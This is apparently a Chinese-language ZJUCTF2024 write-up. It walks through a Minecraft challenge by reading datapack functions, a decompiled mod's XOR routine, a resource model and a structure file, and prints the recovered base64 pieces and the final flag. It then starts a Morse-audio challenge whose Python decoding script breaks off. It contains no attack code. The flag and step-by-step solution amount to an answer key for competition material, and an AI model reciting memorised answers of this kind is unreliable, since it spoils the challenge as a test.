  </a>
  
    <nav class="md-nav" aria-label="Reverse">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#rev-beginner-1" class="md-nav__link">
    <span class="md-ellipsis">
      rev beginner 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rev-beginner-2" class="md-nav__link">
    <span class="md-ellipsis">
      rev beginner 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rev-beginner-3" class="md-nav__link">
    <span class="md-ellipsis">
      rev beginner 3
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#easy-hap" class="md-nav__link">
    <span class="md-ellipsis">
      easy hap
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rukma" class="md-nav__link">
    <span class="md-ellipsis">
      Rukma
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="zjuctf2024-writeup">ZJUCTF2024 Writeup<a class="headerlink" href="#zjuctf2024-writeup" title="Permanent link">&para;</a></h1>
<h2 id="misc">Misc<a class="headerlink" href="#misc" title="Permanent link">&para;</a></h2>
<h3 id="minecretf">Minec(re)tf<a class="headerlink" href="#minecretf" title="Permanent link">&para;</a></h3>
<p>最喜欢的 MC 题。</p>
<p>给了一个存档和一个 testmod，还给了游戏版本 1.20.4 和 fabric 版本，下载下来打开存档看看。</p>
<h4 id="start">Start<a class="headerlink" href="#start" title="Permanent link">&para;</a></h4>
<p>进入存档后出生点在一个 box 里面，游戏模式是 spectator。</p>
<div align="center"><img src="/assets/img/ctf/writeups/zjuctf2024/start.png" width="70%"/></div>

<p>尝试更改游戏模式，立刻会被改回 spectator；尝试走出 box 会被立刻传送回来。告示牌提示 “these constrains must be activated EVERY TICK”，也就是检查玩家游戏模式/位置的指令每 tick 都会执行。</p>
<p>众所周知，tick 是可被命令控制的，于是直接 <code>/tick freeze</code>，此时就随便改游戏模式走出 box 了。</p>
<p>但显然 tick 一直被冻结是没法继续进行的，需要找到限制我们行为的命令方块（？）的位置。这里应该可以用 NBTExplorer 找命令方块，但不知为何一找 command_block 就卡死（可能命令方块太多了？毕竟有一整个区块的命令方块）。</p>
<p>网上到处搜搜，搜到了 <a href="https://modrinth.com/mod/commandspy">CommandSpy</a> 这个 mod，可以显示正在执行的命令的发送者信息，但这个 mod 最高到 1.20，没法放进 1.20.4。</p>
<p>这个好办，下个 1.20 然后降级存档再打开，此时控制台上就会显示正在执行的命令方块的位置了。</p>
<div align="center"><img src="/assets/img/ctf/writeups/zjuctf2024/commandspy.png" width="50%"/></div>

<p>可以看到只有 5 个命令方块在循环执行，全都在 run 某个 function，这些 function 看着不像原版的，应该是数据包引入的。于是打开存档目录下 <code>datapacks</code> 文件夹，找到上面的 function 内容。</p>
<p>先看看 <code>lobby/tptolobby.mcfunction</code>：</p>
<div class="highlight"><pre><span></span><code><span class="nb">tp</span><span class="w"> </span><span class="nv">@a</span><span class="p">[</span><span class="na">tag</span><span class="p">=!</span><span class="nt">inlobby</span><span class="p">]</span><span class="w"> </span><span class="mf">50</span><span class="w"> </span><span class="mf">53</span><span class="w"> </span><span class="mf">50</span>
<span class="nb">spawnpoint</span><span class="w"> </span><span class="nv">@a</span><span class="p">[</span><span class="na">tag</span><span class="p">=!</span><span class="nt">inlobby</span><span class="p">]</span><span class="w"> </span><span class="mf">50</span><span class="w"> </span><span class="mf">53</span><span class="w"> </span><span class="mf">50</span>
<span class="nb">tag</span><span class="w"> </span><span class="nv">@a</span><span class="p">[</span><span class="na">tag</span><span class="p">=!</span><span class="nt">inlobby</span><span class="p">]</span><span class="w"> </span><span class="kc">add</span><span class="w"> </span><span class="kc">inlobby</span>
</code></pre></div>
<p>好像没什么用，玩家一直都有 <code>inlobby</code> 标签。再看看 <code>obfuscation/775533.mcfunction</code>：</p>
<div class="highlight"><pre><span></span><code><span class="nb">gamemode</span><span class="w"> </span><span class="kc">spectator</span><span class="w"> </span><span class="nv">@a</span>

<span class="nb">say</span><span class="w"> </span><span class="kc">The</span><span class="w"> </span><span class="kc">map</span><span class="w"> </span><span class="kc">is</span><span class="w"> </span><span class="kc">under</span><span class="w"> </span><span class="kc">construction.</span><span class="w"> </span><span class="vc">I</span><span class="w"> </span><span class="kc">can</span><span class="w"> </span><span class="kc">only</span><span class="w"> </span><span class="kc">view</span><span class="w"> </span><span class="kc">the</span><span class="w"> </span><span class="kc">map</span>
<span class="nb">give</span><span class="w"> </span><span class="nv">@a</span><span class="w"> </span><span class="kc">repeating_command_block</span><span class="p">{</span><span class="na">display</span><span class="p">:{</span><span class="na">Name</span><span class="p">:</span><span class="s1">&#39;[&quot;&quot;,{&quot;text&quot;:&quot;Script Engine&quot;,&quot;italic&quot;:false,&quot;color&quot;:&quot;aqua&quot;,&quot;bold&quot;:true}]&#39;</span><span class="p">,</span><span class="na">Lore</span><span class="p">:[</span><span class="na">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;Flag Piece[3/9]:cjRmNydz&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">,</span><span class="err">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;&quot;,&quot;</span><span class="nt">color</span><span class="s2">&quot;:&quot;</span><span class="nt">#b2aca2</span><span class="s2">&quot;},{&quot;</span><span class="nt">text</span><span class="s2">&quot;:&quot;</span><span class="nt">the</span><span class="w"> </span><span class="nt">script</span><span class="w"> </span><span class="nt">engine</span><span class="w"> </span><span class="nt">of</span><span class="w"> </span><span class="nt">the</span><span class="w"> </span><span class="nt">flag.</span><span class="s2">&quot;,&quot;</span><span class="nt">color</span><span class="s2">&quot;:&quot;</span><span class="nt">#b2aca2</span><span class="s2">&quot;},{&quot;</span><span class="nt">text</span><span class="s2">&quot;:&quot;&quot;,&quot;</span><span class="nt">italic</span><span class="s2">&quot;:false},{&quot;</span><span class="nt">text</span><span class="s2">&quot;:&quot;</span><span class="err">\\&quot;&quot;,&quot;color&quot;:&quot;#b2aca2&quot;</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">,</span><span class="err">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;You ask me why a flag need a script engine? How could the flag fly without a script engine to run the phisics simulation?&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">,</span><span class="na">&quot;color&quot;</span><span class="p">:</span><span class="s2">&quot;#e8e6e3&quot;</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">]}}</span>
<span class="nb">clear</span><span class="w"> </span><span class="nv">@a</span>
</code></pre></div>
<p>看来这个就是强制玩家模式为 spectator 的命令方块，同时给了一个 flag piece <code>Flag Piece[3/9]:cjRmNydz</code>。进入游戏把对应位置的命令方块拆掉就能改模式了。</p>
<p>浏览一下 <code>obfuscation</code> 目录，每个 function 都会给 flag piece，但相同 flag piece 会给无数个，果然是 obfuscation。把 9 个 piece 都搜一下，发现 <code>Flag Piece[9/9]</code> 只有一个，想必就是第 9 个 piece 了，得到 <code>Flag Piece[9/9]:bWl6RUR9</code>。</p>
<p>再搜一下最后一个运行中的命令方块，这个命令方块执行的命令是：</p>
<div class="highlight"><pre><span></span><code><span class="nb">execute</span><span class="w"> </span><span class="kc">as</span><span class="w"> </span><span class="nv">@a</span><span class="p">[</span><span class="na">scores</span><span class="p">={</span><span class="na">spawner_mined</span><span class="p">=</span><span class="mf">1000000</span><span class="l">..</span><span class="p">},</span><span class="na">tag</span><span class="p">=!</span><span class="nt">recived_reward</span><span class="p">]</span><span class="w"> </span><span class="kc">run</span><span class="nb"> function</span><span class="w"> </span><span class="nf">obfuscation:585664</span>
</code></pre></div>
<p>检测玩家 spawner_mined 分数大于 1000000，运行 <code>obfuscation:585664</code>。这个 function 里面是：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># tp @a 50 62 50</span>

<span class="nb">say</span><span class="w"> </span><span class="kc">You</span><span class="s1">&#39;ve reached 1000000 Score, here&#39;</span><span class="vc">s</span><span class="w"> </span><span class="kc">your</span><span class="w"> </span><span class="kc">reward</span>
<span class="nb">give</span><span class="w"> </span><span class="nv">@s</span><span class="w"> </span><span class="kc">white_dye</span><span class="p">{</span><span class="na">display</span><span class="p">:{</span><span class="na">Name</span><span class="p">:</span><span class="s1">&#39;[&quot;&quot;,{&quot;text&quot;:&quot;Pure Dye&quot;,&quot;italic&quot;:false,&quot;color&quot;:&quot;aqua&quot;,&quot;bold&quot;:true}]&#39;</span><span class="p">,</span><span class="na">Lore</span><span class="p">:[</span><span class="na">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;Flag Piece[7/9]:SUF5X2lU&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">,</span><span class="err">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="vc">You</span><span class="w"> </span><span class="nt">need</span><span class="w"> </span><span class="nt">some</span><span class="w"> </span><span class="nt">dye</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">draw</span><span class="w"> </span><span class="nt">on</span><span class="w"> </span><span class="nt">the</span><span class="w"> </span><span class="nt">flag</span><span class="err">\\&quot;&quot;,&quot;color&quot;:&quot;#b2aca2&quot;</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">,</span><span class="err">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;Scoreboard and tags, the old school cmb.&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">,</span><span class="na">&quot;color&quot;</span><span class="p">:</span><span class="s2">&quot;#e8e6e3&quot;</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">]}}</span>
<span class="nb">tag</span><span class="w"> </span><span class="nv">@s</span><span class="w"> </span><span class="kc">add</span><span class="w"> </span><span class="kc">recived_reward</span>
<span class="nb">scoreboard</span><span class="w"> </span><span class="kc">players</span><span class="w"> </span><span class="kc">remove</span><span class="w"> </span><span class="nv">@s</span><span class="w"> </span><span class="kc">spawner_mined</span><span class="w"> </span><span class="mf">1000000</span>
</code></pre></div>
<p>看来是挖掉 1000000 个刷怪笼会给 flag piece，得到 <code>Flag Piece[7/9]:SUF5X2lU</code>。</p>
<div class="admonition note">
<p class="admonition-title">非预期？</p>
<p>运行 <code>obfuscation:585664</code> 的这个命令方块藏在了那一个区块命令方块里面，但是在这个区块最底下有个凸出来的命令方块，里面运行的命令是一样的，但是没有保持开启，实际上还是内部的命令方块在检查。我先找到底下这个，直接拿到 flag 了。</p>
</div>
<p>再回到游戏，还是没法出去，说明此时不是命令方块在执行命令了。</p>
<p>这里卡了很久，网上搜了很久，才知道 datapack 可以每 tick 执行一次函数。进入数据包的 <code>minecraft/tags/functions</code> 目录，找到 <code>tick.json</code>：</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;values&quot;</span><span class="p">:[</span><span class="s2">&quot;main:loop&quot;</span><span class="p">]}</span>
</code></pre></div>
<p>数据包每 tick 执行 <code>main:loop</code>，找到 <code>main</code> 目录下的 <code>loop.mcfunction</code>：</p>
<div class="highlight"><pre><span></span><code><span class="l">..</span><span class="o">.</span>
<span class="nb">tag</span><span class="w"> </span><span class="nv">@a</span><span class="p">[</span><span class="na">x</span><span class="p">=</span><span class="mf">48</span><span class="p">,</span><span class="na">y</span><span class="p">=</span><span class="mf">61</span><span class="p">,</span><span class="na">z</span><span class="p">=</span><span class="mf">48</span><span class="p">,</span><span class="na">dx</span><span class="p">=</span><span class="mf">4</span><span class="p">,</span><span class="na">dy</span><span class="p">=</span><span class="mf">2</span><span class="p">,</span><span class="na">dz</span><span class="p">=</span><span class="mf">4</span><span class="p">]</span><span class="w"> </span><span class="kc">add</span><span class="w"> </span><span class="kc">in_box</span>
<span class="nb">execute</span><span class="w"> </span><span class="kc">as</span><span class="w"> </span><span class="nv">@a</span><span class="p">[</span><span class="na">tag</span><span class="p">=!</span><span class="nt">in_box</span><span class="p">]</span><span class="w"> </span><span class="kc">run</span><span class="nb"> function</span><span class="w"> </span><span class="nf">obfuscation:317754</span>
<span class="nb">tag</span><span class="w"> </span><span class="nv">@a</span><span class="w"> </span><span class="kc">remove</span><span class="w"> </span><span class="kc">in_box</span>
</code></pre></div>
<p>检查玩家是否在一个 4x2x4 的 box 里面，不在的话执行 <code>obfuscation:317754</code>。这个 function 里面是：</p>
<div class="highlight"><pre><span></span><code><span class="nb">tp</span><span class="w"> </span><span class="nv">@s</span><span class="w"> </span><span class="mf">50</span><span class="w"> </span><span class="mf">62</span><span class="w"> </span><span class="mf">50</span>

<span class="nb">say</span><span class="w"> </span><span class="kc">The</span><span class="w"> </span><span class="kc">map</span><span class="w"> </span><span class="kc">is</span><span class="w"> </span><span class="kc">under</span><span class="w"> </span><span class="kc">construction.</span><span class="w"> </span><span class="vc">I</span><span class="w"> </span><span class="kc">can</span><span class="w"> </span><span class="kc">only</span><span class="w"> </span><span class="kc">stay</span><span class="w"> </span><span class="kc">in</span><span class="w"> </span><span class="kc">the</span><span class="w"> </span><span class="kc">view</span><span class="w"> </span><span class="kc">box</span>
<span class="nb">give</span><span class="w"> </span><span class="nv">@s</span><span class="w"> </span><span class="kc">paper</span><span class="p">{</span><span class="na">display</span><span class="p">:{</span><span class="na">Name</span><span class="p">:</span><span class="s1">&#39;[&quot;&quot;,{&quot;text&quot;:&quot;Code&quot;,&quot;italic&quot;:false,&quot;color&quot;:&quot;aqua&quot;,&quot;bold&quot;:true}]&#39;</span><span class="p">,</span><span class="na">Lore</span><span class="p">:[</span><span class="na">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;Flag Piece[2/9]:e01pTkVj&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">,</span><span class="err">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;&quot;,&quot;</span><span class="nt">color</span><span class="s2">&quot;:&quot;</span><span class="nt">#b2aca2</span><span class="s2">&quot;},{&quot;</span><span class="nt">text</span><span class="s2">&quot;:&quot;</span><span class="nt">the</span><span class="w"> </span><span class="nt">code</span><span class="w"> </span><span class="nt">of</span><span class="w"> </span><span class="nt">the</span><span class="w"> </span><span class="nt">flag.</span><span class="s2">&quot;,&quot;</span><span class="nt">italic</span><span class="s2">&quot;:false,&quot;</span><span class="nt">color</span><span class="s2">&quot;:&quot;</span><span class="nt">#b2aca2</span><span class="s2">&quot;},{&quot;</span><span class="nt">text</span><span class="s2">&quot;:&quot;&quot;,&quot;</span><span class="nt">italic</span><span class="s2">&quot;:false},{&quot;</span><span class="nt">text</span><span class="s2">&quot;:&quot;&quot;,&quot;</span><span class="nt">italic</span><span class="s2">&quot;:false},{&quot;</span><span class="nt">text</span><span class="s2">&quot;:&quot;</span><span class="err">\\&quot;&quot;,&quot;color&quot;:&quot;#b2aca2&quot;</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">,</span><span class="err">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;You ask me why a flag need any code?&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">,</span><span class="na">&quot;color&quot;</span><span class="p">:</span><span class="s2">&quot;#e8e6e3&quot;</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">,</span><span class="err">&#39;</span><span class="p">[</span><span class="na">&quot;&quot;</span><span class="p">,{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;How could the flag fly without some code to specify the behavior of the phisics simulation?&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">,</span><span class="na">&quot;color&quot;</span><span class="p">:</span><span class="s2">&quot;#e8e6e3&quot;</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">},{</span><span class="na">&quot;text&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="na">&quot;italic&quot;</span><span class="p">:</span><span class="nt">false</span><span class="p">}]</span><span class="err">&#39;</span><span class="p">]}}</span>
<span class="nb">clear</span><span class="w"> </span><span class="nv">@s</span>
</code></pre></div>
<p>得到 <code>Flag Piece[2/9]:e01pTkVj</code>。把 <code>loop.mcfunction</code> 里那三行注释掉，重新加载一下数据包就能走出 box 了。</p>
<p>box 底下是个 RPG 地图，通关了也没什么用。</p>
<p>在 datapacks 里面再找找，<code>main/recipes</code> 里面有个 <code>flag_look_at_the_code_of_the_recipe.json</code>。很长，只看第一行：</p>
<blockquote>
<p>Note that this recipe would note be recognized by vanilla minecraft, read the code your self! (or you can give yourself the items by /function obfuscation:855371)</p>
</blockquote>
<p>进入游戏，执行 <code>/function obfuscation:855371</code>，背包里就有各个 piece 的提示了：</p>
<div align="center"><img src="/assets/img/ctf/writeups/zjuctf2024/recipes.png" width="40%"/></div>

<p>第一个 piece 直接给了，得到 <code>Flag Piece[1/9]:WkpVQ1RG</code>。接下来还要找第 4、5、6、8 个 piece。</p>
<h4 id="flag-piece-4">Flag Piece 4<a class="headerlink" href="#flag-piece-4" title="Permanent link">&para;</a></h4>
<blockquote>
<p>There are different <strong>model</strong> of wool in this world. Only the unused one(a special <strong>resources</strong>) can be used to craft a flag.Note: this piece is not an item!</p>
</blockquote>
<p>有一个 wool 的模型藏了 flag piece。打开存档目录下的 <code>resources.zip</code>，找 wool 的模型，在 <code>assets/minecraft/models/block</code> 里面找到 <code>lightblue_wool.json</code> 有点可疑。</p>
<p>credit 说 <code>Made with Blockbench</code>，那就用 <a href="https://web.blockbench.net/">blockbench</a> 打开这个模型文件，得到：</p>
<div align="center"><img src="/assets/img/ctf/writeups/zjuctf2024/blockbench.png" width="50%"/></div>

<p>得到 <code>Flag Piece[4/9]:X20wXmVf</code>。</p>
<h4 id="flag-piece-5">Flag Piece 5<a class="headerlink" href="#flag-piece-5" title="Permanent link">&para;</a></h4>
<blockquote>
<p>It seems that the mod only change the appearance of mobs. However, a certain mob didn't seems right by other people without the mod. People used be able to harvest this special shinny stick form her bones. However, due to the heavy demand of flags, nowadays she hides it behind some <strong>encryption</strong> so that you can't get them.</p>
</blockquote>
<p>意思是 flag 藏在 testmod 中。反编译 <code>testmod-Alpha.1.0.0.jar</code>，找到 <code>TestMobEntity.class</code>，有个 <code>decrypt</code> 方法：</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">decrypt</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="p">)</span><span class="n">mask</span><span class="p">.</span><span class="na">clone</span><span class="p">();</span>
<span class="w">    </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">tmp1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">lore</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">US_ASCII</span><span class="p">);</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">mask</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="w">        </span><span class="n">tmp</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">tmp</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">tmp1</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">lore</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">tmp</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<p>自己实现一下这个解密过程，得到 <code>Flag Piece[5/9]:RnVuX2xm</code>。</p>
<h4 id="flag-piece-6">Flag Piece 6<a class="headerlink" href="#flag-piece-6" title="Permanent link">&para;</a></h4>
<blockquote>
<p>There's 9 <strong>regions</strong> that does not belong to this world, however both worlds are rooted from the same <strong>seed</strong>, The string is the only different between our version and the other. Many taking some <strong>schemetics</strong> and compare the two would be a good idea. Note: this piece is not an item!</p>
</blockquote>
<p>意思是存档中有个地方塞了几个其他世界的区域，要找不同。</p>
<p>在存档目录下找到 <code>region</code> 文件夹，看到几个可疑的区域文件：</p>
<div align="center"><img src="/assets/img/ctf/writeups/zjuctf2024/regions.png" width="30%"/></div>

<p>算一下坐标，tp 过去看看，发现这边只有一个区块（算坐标参考 <a href="https://minecraft.wiki/w/Region_file_format">mcwiki</a>），坐标大概在 <code>394410 ~ -14256522</code>。</p>
<p><code>/seed</code> 查看种子，再用相同的种子新建一个默认世界，传送到对应区块（这里作者搞错坐标了，要用 hint 给的坐标）。</p>
<p>那么如何比较区块差异呢？经常玩生电的朋友肯定知道，litematica 就是干这个的。</p>
<p>装个 litematica，将整个区块保存为原理图。回到原存档，放置原理图，和地图中的区块对齐，然后打开投影的原理图验证选中所有不同的方块，可以看到：</p>
<div align="center"><img src="/assets/img/ctf/writeups/zjuctf2024/litematica.png" width="40%"/></div>

<p>得到 <code>Flag Piece[6/9]:X3kwdV9w</code>。</p>
<h4 id="flag-piece-8">Flag Piece 8<a class="headerlink" href="#flag-piece-8" title="Permanent link">&para;</a></h4>
<blockquote>
<p>I think there will be some gold decorations in the <strong>house of the village gold smith</strong>, that is if their house do spawn. Only if there's some block that let you see their houses...</p>
</blockquote>
<p>“their house do spawn” 暗示需要找到方式生成这个结构。数据包下 <code>main/structures</code> 中有个 <code>gold_smith.nbt</code>，应该是结构文件。用 structure block 生成，结构名称填 <code>main:gold_smith</code>，即可加载结构：</p>
<div align="center"><img src="/assets/img/ctf/writeups/zjuctf2024/gold_smith.png" width="70%"/></div>

<p>结构内的箱子里找到 deocration：</p>
<div align="center"><img src="/assets/img/ctf/writeups/zjuctf2024/decoration.png" width="70%"/></div>

<p>得到 <code>Flag Piece[8/9]:X2N1NXRP</code>。</p>
<h4 id="obtain-the-flag">Obtain the Flag<a class="headerlink" href="#obtain-the-flag" title="Permanent link">&para;</a></h4>
<p>将所有 flag piece 组合起来，得到 <code>WkpVQ1RGe01pTkVjcjRmNydzX20wXmVfRnVuX2xmX3kwdV9wSUF5X2lUX2N1NXRPbWl6RUR9</code>，base64 解码得到 flag <code>ZJUCTF{MiNEcr4f7's_m0^e_Fun_lf_y0u_pIAy_iT_cu5tOmizED}</code>。</p>
<h3 id="_1">锅里捞面<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
<p>给了一个四小时的 mp4，画面是 AAA logo，音频是噪声。</p>
<blockquote>
<p>据说来自 CCBC 的传奇电报员可以一口气发四个小时电报……</p>
</blockquote>
<p>那就是摩斯电码了，把音频丢进 audacity，看到波形，发现有规律的长短音。写个脚本解码：</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">wave</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>

<span class="k">def</span><span class="w"> </span><span class="nf">compress</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">v</span><span class="p">):</span>
    <span class="n">values</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span> <span class="o">&gt;</span> <span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">L</span><span class="p">]</span>
    <span class="k">return</span> <span class="p">[(</span><span class="n">k</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">g</span><span class="p">)))</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">g</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">groupby</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">values</span><span class="p">)),</span> <span class="n">values</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">)]</span>

<span class="k">def</span><span class="w"> </span><span class="nf">decompress</span><span class="p">(</span><span class="n">L</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">L</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">])]</span>

<span class="n">audio</span> <span class="o">=</span> <span class="n">wave</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;output.wav&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
<span class="n">params</span> <span class="o">=</span> <span class="n">audio</span><span class="o">.</span><span class="n">getparams</span><span class="p">()</span>
<span class="nb">print</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>
<span class="n">nchannels</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">samplerate</span><span class="p">,</span> <span class="n">nframes</span> <span class="o">=</span> <span class="n">params</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>

<span class="n">samples</span> <span class="o">=</span> <span class="n">audio</span><span class="o">.</span><span class="n">readframes</span><span class="p">(</span><span class="n">nframes</span><span class="p">)</span>
<span class="n">audio</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

